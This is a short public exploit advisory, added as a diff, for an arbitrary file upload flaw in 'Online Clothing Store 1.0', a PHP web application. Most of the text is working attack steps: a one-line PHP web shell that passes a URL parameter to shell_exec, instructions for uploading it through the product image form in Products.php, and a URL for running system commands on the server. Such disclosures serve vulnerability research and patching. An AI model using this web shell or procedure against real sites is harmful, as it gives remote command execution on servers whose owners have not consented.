@@ -1,0 +1,22 @@
+# Exploit Title: Online Clothing Store 1.0 - Arbitrary File Upload
+# Date: 2020-05-05
+# Exploit Author: Sushant Kamble and Saurav Shukla
+# Vendor Homepage: https://www.sourcecodester.com/php/14185/online-clothing-store.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/razormist/online-clothing-store_0.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+
+#Vulnerable Page: Products.php
+
+#Exploit
+	Open Products.php and select any product
+	Fill details
+	Create php shell code with below script
+		<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+	Click on upload Image
+	Select php file
+	Click Submet
+	Access below URL:
+		http://localhost/online%20Clothing%20Store/Products/shell.php?e=dir
+	add system commands after e to execute it.
